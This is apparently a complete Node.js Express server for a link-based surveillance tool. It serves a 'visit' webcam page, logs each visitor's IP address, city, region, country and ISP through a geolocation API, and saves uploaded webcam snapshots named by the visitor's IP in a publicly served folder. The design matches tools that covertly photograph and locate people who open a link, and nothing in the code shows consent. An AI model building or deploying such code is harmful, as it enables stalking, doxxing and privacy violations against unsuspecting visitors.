// server.js
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use('/captures',express.static('captures'));
app.use(express.json({ limit: '5mb' }));
app.use(express.static('public'));

// Get client IP
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
}

// Serve webcam page
app.get('/visit', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'visit.html'));
});

// Log IP/location
app.get('/log-info', async (req, res) => {
  const ip = getClientIp(req);
  try {
    const { data } = await axios.get(`https://ipwho.is/${ip}`);
    if (!data.success) throw new Error(data.message);

    console.log(`IP: ${data.ip}`);
    console.log(`${data.city}, ${data.region}, ${data.country}`);
    console.log(`ISP: ${data.connection?.isp || 'N/A'}`);

    res.json({ success: true });
  } catch (err) {
    console.error('Geolocation failed:', err.message);
    res.status(500).json({ success: false });
  }
});

// Receive webcam image
app.post('/upload-image', (req, res) => {
  const base64 = req.body.image;
  const ip = getClientIp(req).replace(/:/g, '_');
  const timestamp = Date.now();
  const filePath = `captures/${ip}_${timestamp}.png`;

  fs.mkdirSync('captures', { recursive: true });

  fs.writeFileSync(filePath, base64.replace(/^data:image\/png;base64,/, ''), 'base64');
  console.log(`Image saved: https://your-app.onrender.com/${filePath}`);
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});